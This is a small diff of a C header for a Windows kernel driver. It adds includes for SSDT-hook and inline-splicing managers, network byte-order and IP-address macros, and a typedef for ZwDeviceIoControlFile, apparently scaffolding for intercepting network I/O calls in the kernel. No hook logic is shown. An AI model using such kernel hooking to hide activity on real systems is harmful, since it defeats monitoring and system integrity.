@@ -1,9 +1,10 @@
 #pragma once
-#include <ntddk.h>
-#include <basetsd.h>
-#include <windef.h>
-
 #include "../../SplicingManager/SplicingManager.h"
+#include "../../SSDTManager/SSDTHooksManager.h"
+#include "../../Structs/Structs.h"
+
+#define HTONS(a)  (((0xFF&a)<<8) + ((0xFF00&a)>>8)) 
+#define IP_ADDR(a,b,c,d) ((a << 24) + (b << 16) + (c << 8) + d)
 
 typedef NTSTATUS(*ZW_DEVICE_IO_CONTROL_FILE)(
     IN HANDLE  FileHandle,
